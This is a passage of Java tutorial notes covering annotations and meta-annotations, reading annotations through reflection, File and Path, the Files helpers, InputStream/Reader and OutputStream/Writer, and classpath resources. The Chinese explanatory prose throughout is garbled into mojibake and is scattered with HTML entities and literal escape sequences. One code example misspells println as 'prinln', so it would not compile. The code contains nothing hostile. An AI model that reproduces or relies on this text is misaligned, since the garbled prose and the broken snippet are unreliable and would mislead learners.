è½½classçš„æ—¶å€™ï¼Œå¯¹classåšåŠ¨æ€ä¿®æ”¹ï¼Œå®ç°ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½ï¼›è¿™ç±»æ³¨è§£ä¼šè¢«ç¼–è¯‘è¿›å…¥.classæ–‡ä»¶ï¼Œä½†åŠ è½½ç»“æŸåå¹¶ä¸ä¼šå­˜åœ¨äºå†…å­˜ä¸­ 3 ç¨‹åºè¿è¡ŒæœŸå¯è¯»å–çš„æ³¨è§£ï¼šåŠ è½½åä¸€ç›´å­˜åœ¨äºJVMä¸­ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ³¨è§£ @PostConstructï¼šé…ç½®äº†å®ƒçš„æ–¹æ³•ä¼šåœ¨è°ƒç”¨æ„é€ æ–¹æ³•åè‡ªåŠ¨è¢«è°ƒç”¨ï¼Œè¿™æ˜¯Javaä»£ç è¯»å–è¯¥æ³¨è§£å®ç°çš„åŠŸèƒ½ï¼ŒJVMå¹¶ä¸ä¼šè¯†åˆ«è¯¥æ³¨è§£\nå®šä¹‰ä¸€ä¸ªæ³¨è§£æ—¶ï¼Œè¿˜å¯ä»¥å®šä¹‰é…ç½®å‚æ•°ï¼Œé…ç½®å‚æ•°å¯ä»¥åŒ…æ‹¬ï¼šåŸºæœ¬ç±»å‹ï¼ŒStringï¼Œæšä¸¾ç±»ï¼ŒåŸºæœ¬ç±»å‹ã€Stringã€Classä»¥åŠæšä¸¾çš„æ•°ç»„ï¼›å¯ä»¥è®¾ç½®ç¼ºçœå€¼ï¼Œå¦‚æœåªå†™æ³¨è§£ï¼Œç›¸å½“äºå…¨éƒ¨ä½¿ç”¨é»˜è®¤å€¼ public class Hello { @Check(min=0, max=100, value=55) public int n; @Check(value=99) public int p; @Check(99) // @Check(value=99) public int x; @Check public int y; } @Checkå°±æ˜¯ä¸€ä¸ªæ³¨è§£\næœ‰ä¸€äº›æ³¨è§£å¯ä»¥ä¿®é¥°å…¶ä»–æ³¨è§£ï¼Œè¿™äº›æ³¨è§£å°±ç§°ä¸ºå…ƒæ³¨è§£Meta annotation @Targetï¼šä½¿ç”¨@Targetå¯ä»¥å®šä¹‰Annotationèƒ½å¤Ÿè¢«åº”ç”¨äºæºç çš„å“ªäº›ä½ç½®\nç±»æˆ–æ¥å£ï¼šElementType.TYPE å­—æ®µï¼šElementType.FIELD æ–¹æ³•ï¼šElementType.METHOD æ„é€ æ–¹æ³•ï¼šElementType.CONSTRUCTOR æ–¹æ³•å‚æ•°ï¼šElementType.PARAMETER @Retentionï¼šå®šä¹‰äº†Annotationçš„ç”Ÿå‘½å‘¨æœŸï¼Œé€šå¸¸æˆ‘ä»¬è‡ªå®šä¹‰çš„Annotationéƒ½æ˜¯RUNTIME\nä»…ç¼–è¯‘æœŸï¼šRetentionPolicy.SOURCE\tç¼–è¯‘å™¨è¢«ä¸¢æ‰ ä¸€èˆ¬ä¸ç”¨(ç¼–è¯‘å™¨ä½¿ç”¨) ä»…classæ–‡ä»¶ï¼šRetentionPolicy.CLASS\tä»…ä¿å­˜åœ¨classæ–‡ä»¶ä¸­ ä¸ä¼šè¢«åŠ è½½å…¥JVM(åº•å±‚å·¥å…·åº“ä½¿ç”¨ æ¶‰åŠclassçš„åŠ è½½) è¿è¡ŒæœŸï¼šRetentionPolicy.RUNTIME\tä¼šè¢«åŠ è½½è¿›JVM å¹¶åœ¨è¿è¡ŒæœŸè¢«ç¨‹åºè¯»å–(å¸¸ç”¨) @Repeatableï¼šå®šä¹‰Annotationæ˜¯å¦å¯é‡å¤\n@Inheritedï¼šå®šä¹‰å­ç±»æ˜¯å¦å¯ç»§æ‰¿çˆ¶ç±»å®šä¹‰çš„Annotatioï¼Œä»…é’ˆå¯¹@Target(ElementType.TYPE)ç±»å‹çš„annotationæœ‰æ•ˆï¼Œå¹¶ä¸”ä»…é’ˆå¯¹classçš„ç»§æ‰¿ï¼Œå¯¹interfaceçš„ç»§æ‰¿æ— æ•ˆ\nä½¿ç”¨@interfaceè¯­æ³•æ¥å®šä¹‰æ³¨è§£ï¼Œç”¨å…ƒæ³¨é‡Šæ¥é…ç½®æ³¨é‡Šï¼Œå…¶ä¸­@Targetå’Œ@Retention(ä¸€èˆ¬è®¾ä¸ºRUNTIME)å¿…é¡»è®¾ç½® @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) public @interface Report { int type() default 0; String level() default \u0026#34;info\u0026#34;; String value() default \u0026#34;\u0026#34;; } å¤„ç†æ³¨è§£ æ³¨è§£æœ¬èº«å¯¹ä»£ç é€»è¾‘æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå¦‚ä½•ä½¿ç”¨æ³¨è§£å®Œå…¨ç”±å·¥å…·å†³å®š\næ³¨è§£å®šä¹‰åä¹Ÿæ˜¯ä¸€ç§classï¼Œæ‰€æœ‰çš„æ³¨è§£éƒ½ç»§æ‰¿è‡ªjava.lang.annotation.Annotationï¼Œæ‰€ä»¥è¯»å–æ³¨è§£éœ€è¦ç”¨åˆ°åå°„\nåˆ¤æ–­æŸä¸ªæ³¨è§£æ˜¯å¦å­˜åœ¨äºClassã€Fieldã€Methodæˆ–Constructorï¼š\nClass.isAnnotationPresent(Class) Field.isAnnotationPresent(Class) Method.isAnnotationPresent(Class) Constructor.isAnnotationPresent(Class) // åˆ¤æ–­@Reportæ˜¯å¦å­˜åœ¨äºPersonç±»: Person.class.isAnnotationPresent(Report.class); åå°„APIè¯»å–Annotationï¼š\nClass.getAnnotation(Class) Field.getAnnotation(Class) Method.getAnnotation(Class) Constructor.getAnnotation(Class) // è·å–Personå®šä¹‰çš„@Reportæ³¨è§£: Report report = Person.class.getAnnotation(Report.class); int type = report.type(); String level = report.level(); ä½¿ç”¨åå°„APIè¯»å–Annotationæœ‰ä¸¤ç§æ–¹æ³•ã€‚æ–¹æ³•ä¸€æ˜¯å…ˆåˆ¤æ–­Annotationæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±ç›´æ¥è¯»å–ï¼š\nClass cls = Person.class; if (cls.isAnnotationPresent(Report.class)) { Report report = cls.getAnnotation(Report.class); ... } ç¬¬äºŒç§æ–¹æ³•æ˜¯ç›´æ¥è¯»å–Annotationï¼Œå¦‚æœAnnotationä¸å­˜åœ¨ï¼Œå°†è¿”å›nullï¼š\nClass cls = Person.class; Report report = cls.getAnnotation(Report.class); if (report != null) { ... } è¯»å–æ–¹æ³•ã€å­—æ®µå’Œæ„é€ æ–¹æ³•çš„Annotationå’ŒClassç±»ä¼¼ã€‚ä½†è¦è¯»å–æ–¹æ³•å‚æ•°çš„Annotationå°±æ¯”è¾ƒéº»çƒ¦ä¸€ç‚¹ï¼Œå› ä¸ºæ–¹æ³•å‚æ•°æœ¬èº«å¯ä»¥çœ‹æˆä¸€ä¸ªæ•°ç»„ï¼Œè€Œæ¯ä¸ªå‚æ•°åˆå¯ä»¥å®šä¹‰å¤šä¸ªæ³¨è§£ï¼Œæ‰€ä»¥ï¼Œä¸€æ¬¡è·å–æ–¹æ³•å‚æ•°çš„æ‰€æœ‰æ³¨è§£å°±å¿…é¡»ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„æ¥è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œå¯¹äºä»¥ä¸‹æ–¹æ³•å®šä¹‰çš„æ³¨è§£ï¼š\npublic void hello(@NotNull @Range(max=5) String name, @NotNull String prefix) { } è¦è¯»å–æ–¹æ³•å‚æ•°çš„æ³¨è§£ï¼Œæˆ‘ä»¬å…ˆç”¨åå°„è·å–Methodå®ä¾‹ï¼Œç„¶åè¯»å–æ–¹æ³•å‚æ•°çš„æ‰€æœ‰æ³¨è§£ï¼š\n// è·å–Methodå®ä¾‹: Method m = ... // è·å–æ‰€æœ‰å‚æ•°çš„Annotation: Annotation[][] annos = m.getParameterAnnotations(); // ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆç´¢å¼•ä¸º0ï¼‰çš„æ‰€æœ‰Annotation: Annotation[] annosOfName = annos[0]; for (Annotation anno : annosOfName) { if (anno instanceof Range) { // @Rangeæ³¨è§£ Range r = (Range) anno; } if (anno instanceof NotNull) { // @NotNullæ³¨è§£ NotNull n = (NotNull) anno; } } å®šä¹‰äº†æ³¨è§£ï¼Œæœ¬èº«å¯¹ç¨‹åºé€»è¾‘æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå¿…é¡»è‡ªå·±ç¼–å†™ä»£ç æ¥ä½¿ç”¨æ³¨è§£\n@Retention(RetentionPolicy.RUNTIME) @Target(ElementType.FIELD) public @interface Range { int min() default 0; int max() default 255; } void check(Person person) throws IllegalArgumentException, ReflectiveOperationException { // éå†æ‰€æœ‰Field: for (Field field : person.getClass().getFields()) { // è·å–Fieldå®šä¹‰çš„@Range: Range range = field.getAnnotation(Range.class); // å¦‚æœ@Rangeå­˜åœ¨: if (range != null) { // è·å–Fieldçš„å€¼: Object value = field.get(person); // å¦‚æœå€¼æ˜¯String: if (value instanceof String) { String s = (String) value; // åˆ¤æ–­å€¼æ˜¯å¦æ»¡è¶³@Rangeçš„min/max: if (s.length() \u0026lt; range.min() || s.length() \u0026gt; range.max()) { throw new IllegalArgumentException(\u0026#34;Invalid field: \u0026#34; + field.getName()); } } } } } è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬é€šè¿‡@Rangeæ³¨è§£ï¼Œé…åˆcheck()æ–¹æ³•ï¼Œå°±å¯ä»¥å®ŒæˆPersonå®ä¾‹çš„æ£€æŸ¥ã€‚æ³¨æ„æ£€æŸ¥é€»è¾‘å®Œå…¨æ˜¯æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ï¼ŒJVMä¸ä¼šè‡ªåŠ¨ç»™æ³¨è§£æ·»åŠ ä»»ä½•é¢å¤–çš„é€»è¾‘ã€‚\nIO File\u0026amp;Path æ ‡å‡†åº“java.ioæä¾›Fileå¯¹è±¡æ¥æ“ä½œæ–‡ä»¶å’Œç›®å½•ï¼Œå¯ä»¥ä¼ å…¥ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ï¼›å³ä½¿ä¼ å…¥çš„ä¸å­˜åœ¨ä¹Ÿä¸æŠ¥é”™ï¼Œå¯ä»¥ç”¨isFile, isDirectoryè¿›è¡Œæ£€æŸ¥ Fileå¯¹è±¡æ—¢å¯ä»¥è¡¨ç¤ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è¡¨ç¤ºç›®å½•ï¼Œå¯ä»¥ç”¨getPath(ä¼ å…¥è·¯å¾„), getAbsolutePath(ç»å¯¹è·¯å¾„), getCanonicalPath(è§„èŒƒè·¯å¾„) å½“Fileå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªç›®å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨list()å’ŒlistFiles()åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•åï¼ŒlistFiles()æä¾›äº†ä¸€ç³»åˆ—é‡è½½æ–¹æ³•ï¼Œå¯ä»¥è¿‡æ»¤ä¸æƒ³è¦çš„æ–‡ä»¶å’Œç›®å½• import java.io.*; public class Main { public static void main(String[] args) throws IOException { File f = new File(\u0026#34;C:\\\\Windows\u0026#34;); File[] fs1 = f.listFiles(); // åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½• printFiles(fs1); File[] fs2 = f.listFiles(new FilenameFilter() { // ä»…åˆ—å‡º.exeæ–‡ä»¶ public boolean accept(File dir, String name) { return name.endsWith(\u0026#34;.exe\u0026#34;); // è¿”å›trueè¡¨ç¤ºæ¥å—è¯¥æ–‡ä»¶ } }); printFiles(fs2); } static void printFiles(File[] files) { System.out.println(\u0026#34;==========\u0026#34;); if (files != null) { for (File f : files) { System.out.println(f); } } System.out.println(\u0026#34;==========\u0026#34;); } } å…¶å®ƒAPI boolean canRead()ï¼šæ˜¯å¦å¯è¯» boolean canWrite()ï¼šæ˜¯å¦å¯å†™ boolean canExecute()ï¼šæ˜¯å¦å¯æ‰§è¡Œ long length()ï¼šæ–‡ä»¶å­—èŠ‚å¤§å° boolean mkdir()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½• boolean mkdirs()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå¹¶åœ¨å¿…è¦æ—¶å°†ä¸å­˜åœ¨çš„çˆ¶ç›®å½•ä¹Ÿåˆ›å»ºå‡ºæ¥ boolean delete()ï¼šåˆ é™¤å½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå½“å‰ç›®å½•å¿…é¡»ä¸ºç©ºæ‰èƒ½åˆ é™¤æˆåŠŸ å¯ä»¥ç”¨createTempFile()æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œä»¥åŠdeleteOnExit()åœ¨JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤è¯¥æ–‡ä»¶ import java.io.*; public class Main { public static void main(String[] args) throws IOException { File f = File.createTempFile(\u0026#34;tmp-\u0026#34;, \u0026#34;.txt\u0026#34;); // æä¾›ä¸´æ—¶æ–‡ä»¶çš„å‰ç¼€å’Œåç¼€ f.deleteOnExit(); // JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤ System.out.println(f.isFile()); System.out.println(f.getAbsolutePath()); } } Pathå¯¹è±¡ä½äºjava.nio.fileåŒ…ï¼Œå’ŒFileå¯¹è±¡ç±»ä¼¼ï¼Œä½†æ“ä½œæ›´åŠ ç®€å•ï¼Œä¾¿äºæ“ä½œç›®å½•çš„æ‹¼æ¥ã€éå†ç­‰ import java.io.*; import java.nio.file.*; public class Main { public static void main(String[] args) throws IOException { Path p1 = Paths.get(\u0026#34;.\u0026#34;, \u0026#34;project\u0026#34;, \u0026#34;study\u0026#34;); // æ„é€ ä¸€ä¸ªPathå¯¹è±¡ System.out.println(p1); Path p2 = p1.toAbsolutePath(); // è½¬æ¢ä¸ºç»å¯¹è·¯å¾„ System.out.println(p2); Path p3 = p2.normalize(); // è½¬æ¢ä¸ºè§„èŒƒè·¯å¾„ System.out.println(p3); File f = p3.toFile(); // è½¬æ¢ä¸ºFileå¯¹è±¡ System.out.println(f); for (Path p : Paths.get(\u0026#34;..\u0026#34;).toAbsolutePath()) { // å¯ä»¥ç›´æ¥éå†Path System.out.println(\u0026#34; \u0026#34; + p); } } } Files\u0026amp;Paths æ˜¯java.nioåŒ…é‡Œé¢çš„ç±»ï¼Œå°è£…äº†å¾ˆå¤šè¯»å†™æ–‡ä»¶çš„ç®€å•æ–¹æ³•\n// æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºä¸€ä¸ªbyte[] byte[] data = Files.readAllBytes(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;)); // æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºString // é»˜è®¤ä½¿ç”¨UTF-8ç¼–ç è¯»å–: String content1 = Files.readString(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;)); // å¯æŒ‡å®šç¼–ç : String content2 = Files.readString(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), StandardCharsets.ISO_8859_1); // æŒ‰è¡Œè¯»å–å¹¶è¿”å›æ¯è¡Œå†…å®¹: List\u0026lt;String\u0026gt; lines = Files.readAllLines(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;)); // å†™å…¥æ–‡ä»¶ // å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶: byte[] data = ... Files.write(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), data); // å†™å…¥æ–‡æœ¬å¹¶æŒ‡å®šç¼–ç : Files.writeString(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), \u0026#34;æ–‡æœ¬å†…å®¹...\u0026#34;, StandardCharsets.ISO_8859_1); // æŒ‰è¡Œå†™å…¥æ–‡æœ¬: List\u0026lt;String\u0026gt; lines = ... Files.write(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), lines); æ³¨æ„ï¼ŒFilesæä¾›çš„è¯»å†™æ–¹æ³•ï¼Œå—å†…å­˜é™åˆ¶ï¼Œåªèƒ½è¯»å†™å°æ–‡ä»¶ï¼Œä¾‹å¦‚é…ç½®æ–‡ä»¶ç­‰ï¼Œä¸å¯ä¸€æ¬¡è¯»å…¥å‡ ä¸ªGçš„å¤§æ–‡ä»¶ã€‚è¯»å†™å¤§å‹æ–‡ä»¶ä»ç„¶è¦ä½¿ç”¨æ–‡ä»¶æµï¼Œæ¯æ¬¡åªè¯»å†™ä¸€éƒ¨åˆ†æ–‡ä»¶å†…å®¹\nå­—èŠ‚æµè¯»å†™ InputStreamä»£è¡¨è¾“å…¥å­—èŠ‚æµï¼ŒOuputStreamä»£è¡¨è¾“å‡ºå­—èŠ‚æµï¼Œä»¥byteä¸ºæœ€å°å•ä½\nReaderå’ŒWriterè¡¨ç¤ºå­—ç¬¦æµ(è¯»å†™å­—ç¬¦ï¼Œå¹¶ä¸”å­—ç¬¦ä¸å…¨æ˜¯å•å­—èŠ‚è¡¨ç¤ºçš„ASCIIå­—ç¬¦)ï¼Œä»¥charä¸ºæœ€å°å•ä½\nå¦‚æœæ•°æ®æºä¸æ˜¯æ–‡æœ¬ï¼Œå°±åªèƒ½ä½¿ç”¨InputStreamï¼Œå¦‚æœæ•°æ®æºæ˜¯æ–‡æœ¬ï¼Œä½¿ç”¨Readeræ›´æ–¹ä¾¿ä¸€äº›\nInputStreamå¹¶ä¸æ˜¯ä¸€ä¸ªæ¥å£ï¼Œè€Œæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰è¾“å…¥æµçš„è¶…ç±»ï¼Œè¿™ä¸ªæŠ½è±¡ç±»å®šä¹‰çš„ä¸€ä¸ªæœ€é‡è¦çš„æ–¹æ³•å°±æ˜¯int read()\npublic abstract int read() throws IOException; è¿™ä¸ªæ–¹æ³•ä¼šè¯»å–è¾“å…¥æµçš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶è¿”å›å­—èŠ‚è¡¨ç¤ºçš„intå€¼ï¼ˆ0~255ï¼‰ï¼Œå¦‚æœå·²è¯»åˆ°æœ«å°¾ï¼Œè¿”å›-1è¡¨ç¤ºä¸èƒ½ç»§ç»­è¯»å–äº†\nFileInputStreamæ˜¯InputStreamçš„ä¸€ä¸ªå­ç±»ï¼Œä»æ–‡ä»¶æµä¸­è¯»å–æ•°æ® public void readFile() throws IOException{ InputStream input = new FileInputStream(\u0026#34;src/readme.md\u0026#34;); for(;;){ int n = input.read(); if(n == -1){ break; } System.out.println(n); } input.close(); } æ‰€æœ‰ä¸IOæ“ä½œç›¸å…³çš„ä»£ç éƒ½å¿…é¡»æ­£ç¡®å¤„ç†IOExceptionï¼Œå¯ä»¥ç”¨try ... finallyæ¥ä¿è¯InputStreamåœ¨æ— è®ºæ˜¯å¦å‘ç”ŸIOé”™è¯¯çš„æ—¶å€™éƒ½èƒ½å¤Ÿæ­£ç¡®åœ°å…³é—­ public void readFile() throws IOException{ InputStream input = null; try{ input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;); int n; while((n = input.read())!=-1){ System.out.prinln(n); } }finally{ if(input!=null){ input.close(); } } } java7ä¹‹åå¯ä»¥ç”¨æ›´ç®€å•çš„try(resource) public void readFile() throws IOException { try (InputStream input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;)) { int n; while ((n = input.read()) != -1) { System.out.println(n); } } // ç¼–è¯‘å™¨åœ¨æ­¤è‡ªåŠ¨ä¸ºæˆ‘ä»¬å†™å…¥finallyå¹¶è°ƒç”¨close() } å®é™…ä¸Šï¼Œç¼–è¯‘å™¨å¹¶ä¸ä¼šç‰¹åˆ«åœ°ä¸ºInputStreamåŠ ä¸Šè‡ªåŠ¨å…³é—­ã€‚ç¼–è¯‘å™¨åªçœ‹try(resource = ...)ä¸­çš„å¯¹è±¡æ˜¯å¦å®ç°äº†java.lang.AutoCloseableæ¥å£ï¼Œå¦‚æœå®ç°äº†ï¼Œå°±è‡ªåŠ¨åŠ ä¸Šfinallyè¯­å¥å¹¶è°ƒç”¨close()æ–¹æ³•ã€‚InputStreamå’ŒOutputStreaméƒ½å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œå› æ­¤éƒ½å¯ä»¥ç”¨åœ¨try(resource)ä¸­\nInputStreamæä¾›äº†ä¸¤ä¸ªé‡è½½æ–¹æ³•æ¥æ”¯æŒè¯»å–å¤šä¸ªå­—èŠ‚ int read(byte[] b)ï¼šè¯»å–è‹¥å¹²å­—èŠ‚å¹¶å¡«å……åˆ°byte[]æ•°ç»„ï¼Œè¿”å›è¯»å–çš„å­—èŠ‚æ•° int read(byte[] b, int off, int len)ï¼šæŒ‡å®šbyte[]æ•°ç»„çš„åç§»é‡å’Œæœ€å¤§å¡«å……æ•° åˆ©ç”¨ä¸Šè¿°æ–¹æ³•ä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚æ—¶ï¼Œéœ€è¦å…ˆå®šä¹‰ä¸€ä¸ªbyte[]æ•°ç»„ä½œä¸ºç¼“å†²åŒºï¼Œread()æ–¹æ³•ä¼šå°½å¯èƒ½å¤šåœ°è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒºï¼Œ ä½†ä¸ä¼šè¶…è¿‡ç¼“å†²åŒºçš„å¤§å°ã€‚read()æ–¹æ³•çš„è¿”å›å€¼ä¸å†æ˜¯å­—èŠ‚çš„intå€¼ï¼Œè€Œæ˜¯è¿”å›å®é™…è¯»å–äº†å¤šå°‘ä¸ªå­—èŠ‚ã€‚å¦‚æœè¿”å›-1ï¼Œè¡¨ç¤ºæ²¡æœ‰æ›´å¤šçš„æ•°æ®äº†\nåˆ©ç”¨ç¼“å†²åŒºä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚çš„ä»£ç å¦‚ä¸‹ï¼š\npublic void readFile() throws IOException { try (InputStream input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;)) { // å®šä¹‰1000ä¸ªå­—èŠ‚å¤§å°çš„ç¼“å†²åŒº: byte[] buffer = new byte[1000]; int n; while ((n = input.read(buffer)) != -1) { // è¯»å–åˆ°ç¼“å†²åŒº System.out.println(\u0026#34;read \u0026#34; + n + \u0026#34; bytes.\u0026#34;); } } } é™¤FileInputStreamä»¥å¤–è¿˜æœ‰ByteArrayInputStreamå¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªInputStreamï¼Œå®é™…ä¸Šæ˜¯æŠŠä¸€ä¸ªbyte[]æ•°ç»„åœ¨å†…å­˜ä¸­å˜æˆä¸€ä¸ªInputStream import java.io.*; public class Main { public static void main(String[] args) throws IOException { byte[] data = { 72, 101, 108, 108, 111, 33 }; try (InputStream input = new ByteArrayInputStream(data)) { int n; while ((n = input.read()) != -1) { System.out.println((char)n); } } } } OutputStreamè¿˜æä¾›äº†ä¸€ä¸ªflush()æ–¹æ³•ï¼Œå®ƒçš„ç›®çš„æ˜¯å°†ç¼“å†²åŒºçš„å†…å®¹çœŸæ­£è¾“å‡ºåˆ°ç›®çš„åœ° å­—ç¬¦æµè¯»å†™ InputStream Reader å­—èŠ‚æµï¼Œä»¥byteä¸ºå•ä½ å­—ç¬¦æµï¼Œä»¥charä¸ºå•ä½ è¯»å–å­—èŠ‚ï¼ˆ-1ï¼Œ0~255ï¼‰ï¼šint read() è¯»å–å­—ç¬¦ï¼ˆ-1ï¼Œ0~65535ï¼‰ï¼šint read() è¯»åˆ°å­—èŠ‚æ•°ç»„ï¼šint read(byte[] b) è¯»åˆ°å­—ç¬¦æ•°ç»„ï¼šint read(char[] c) é™¤äº†ç‰¹æ®Šçš„CharArrayReaderå’ŒStringReaderï¼Œæ™®é€šçš„Readerå®é™…ä¸Šæ˜¯åŸºäºInputStreamæ„é€ çš„ï¼Œå› ä¸ºReaderéœ€è¦ä»InputStreamä¸­è¯»å…¥å­—èŠ‚æµï¼ˆbyteï¼‰ï¼Œç„¶åï¼Œæ ¹æ®ç¼–ç è®¾ç½®ï¼Œå†è½¬æ¢ä¸ºcharå°±å¯ä»¥å®ç°å­—ç¬¦æµã€‚å¦‚æœæˆ‘ä»¬æŸ¥çœ‹FileReaderçš„æºç ï¼Œå®ƒåœ¨å†…éƒ¨å®é™…ä¸ŠæŒæœ‰ä¸€ä¸ªFileInputStreamã€‚\næ—¢ç„¶Readeræœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŸºäºInputStreamçš„byteåˆ°charçš„è½¬æ¢å™¨ï¼Œé‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªInputStreamï¼Œæƒ³æŠŠå®ƒè½¬æ¢ä¸ºReaderï¼Œæ˜¯å®Œå…¨å¯è¡Œçš„ã€‚InputStreamReaderå°±æ˜¯è¿™æ ·ä¸€ä¸ªè½¬æ¢å™¨ï¼Œå®ƒå¯ä»¥æŠŠä»»ä½•InputStreamè½¬æ¢ä¸ºReaderã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\n// æŒæœ‰InputStream: InputStream input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;); // å˜æ¢ä¸ºReader: Reader reader = new InputStreamReader(input, \u0026#34;UTF-8\u0026#34;); æ„é€ InputStreamReaderæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥InputStreamï¼Œè¿˜éœ€è¦æŒ‡å®šç¼–ç ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªReaderå¯¹è±¡ã€‚ä¸Šè¿°ä»£ç å¯ä»¥é€šè¿‡try (resource)æ›´ç®€æ´åœ°æ”¹å†™å¦‚ä¸‹ï¼š\ntry (Reader reader = new InputStreamReader(new FileInputStream(\u0026#34;src/readme.txt\u0026#34;), \u0026#34;UTF-8\u0026#34;)) { // TODO: } ä¸Šè¿°ä»£ç å®é™…ä¸Šå°±æ˜¯FileReaderçš„ä¸€ç§å®ç°æ–¹å¼ã€‚\nä½¿ç”¨try (resource)ç»“æ„æ—¶ï¼Œå½“æˆ‘ä»¬å…³é—­Readeræ—¶ï¼Œå®ƒä¼šåœ¨å†…éƒ¨è‡ªåŠ¨è°ƒç”¨InputStreamçš„close()æ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œåªéœ€è¦å…³é—­æœ€å¤–å±‚çš„Readerå¯¹è±¡å³å¯\nOutputStream Writer å­—èŠ‚æµï¼Œä»¥byteä¸ºå•ä½ å­—ç¬¦æµï¼Œä»¥charä¸ºå•ä½ å†™å…¥å­—èŠ‚ï¼ˆ0~255ï¼‰ï¼švoid write(int b) å†™å…¥å­—ç¬¦ï¼ˆ0~65535ï¼‰ï¼švoid write(int c) å†™å…¥å­—èŠ‚æ•°ç»„ï¼švoid write(byte[] b) å†™å…¥å­—ç¬¦æ•°ç»„ï¼švoid write(char[] c) æ— å¯¹åº”æ–¹æ³• å†™å…¥Stringï¼švoid write(String s) é™¤äº†CharArrayWriterå’ŒStringWriterå¤–ï¼Œæ™®é€šçš„Writerå®é™…ä¸Šæ˜¯åŸºäºOutputStreamæ„é€ çš„ï¼Œå®ƒæ¥æ”¶charï¼Œç„¶ååœ¨å†…éƒ¨è‡ªåŠ¨è½¬æ¢æˆä¸€ä¸ªæˆ–å¤šä¸ªbyteï¼Œå¹¶å†™å…¥OutputStreamã€‚å› æ­¤ï¼ŒOutputStreamWriterå°±æ˜¯ä¸€ä¸ªå°†ä»»æ„çš„OutputStreamè½¬æ¢ä¸ºWriterçš„è½¬æ¢å™¨ï¼š\ntry (Writer writer = new OutputStreamWriter(new FileOutputStream(\u0026#34;readme.txt\u0026#34;), \u0026#34;UTF-8\u0026#34;)) { // TODO: } ä¸Šè¿°ä»£ç å®é™…ä¸Šå°±æ˜¯FileWriterçš„ä¸€ç§å®ç°æ–¹å¼ï¼Œè¿™å’Œä¸Šé¢çš„InputStreamReaderæ˜¯ä¸€æ ·çš„\nFilteræ¨¡å¼ Filteræ¨¡å¼å¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€å¢åŠ åŠŸèƒ½ï¼Œåˆç§°Decoratoræ¨¡å¼\nclasspath ä»classpathè¯»å–æ–‡ä»¶å°±å¯ä»¥é¿å…ä¸åŒç¯å¢ƒä¸‹æ–‡ä»¶è·¯å¾„ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œåœ¨classpathä¸­çš„èµ„æºæ–‡ä»¶ï¼Œè·¯å¾„æ€»æ˜¯ä»¥ï¼å¼€å¤´ï¼Œæˆ‘ä»¬å…ˆè·å–å½“å‰çš„Classå¯¹è±¡ï¼Œç„¶åè°ƒç”¨getResourceAsStream()å°±å¯ä»¥ç›´æ¥ä»classpathè¯»å–ä»»æ„çš„èµ„æºæ–‡ä»¶ï¼š\ntry (InputStream input = getClass().getResourceAsStream(\u0026#34;/default.properties\u0026#34;)) { // TODO: } è°ƒç”¨getResourceAsStream()éœ€è¦ç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœèµ„æºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒå°†è¿”å›nullã€‚å› 